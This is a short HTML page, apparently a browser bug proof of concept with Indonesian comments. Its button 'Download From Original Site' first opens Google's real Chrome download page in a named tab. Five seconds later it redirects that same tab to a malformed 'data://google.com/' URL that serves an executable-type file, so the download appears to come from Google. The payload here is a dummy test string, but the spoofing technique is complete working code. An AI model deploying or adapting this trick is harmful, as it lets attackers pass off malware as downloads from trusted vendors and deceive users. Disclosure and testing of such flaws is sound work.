<html>
 <head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
 </head>
 <body>
  <script>
    function a(){
      // 1. Buka situs asli di tab baru dengan nama target 'x'
      window.open('https://www.google.com/intl/id_id/chrome/', 'x');
      
      // 2. Tunggu 5 detik, lalu paksa tab 'x' tersebut untuk menavigasi ke malformed data URL
      setTimeout(function(){
        window.open('data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=', 'x');
      }, 5000);
    }
  </script>
  <center>
    <input type="button" class="button" value="Download From Original Site" onclick="a()">
  </center>
 </body>
</html>
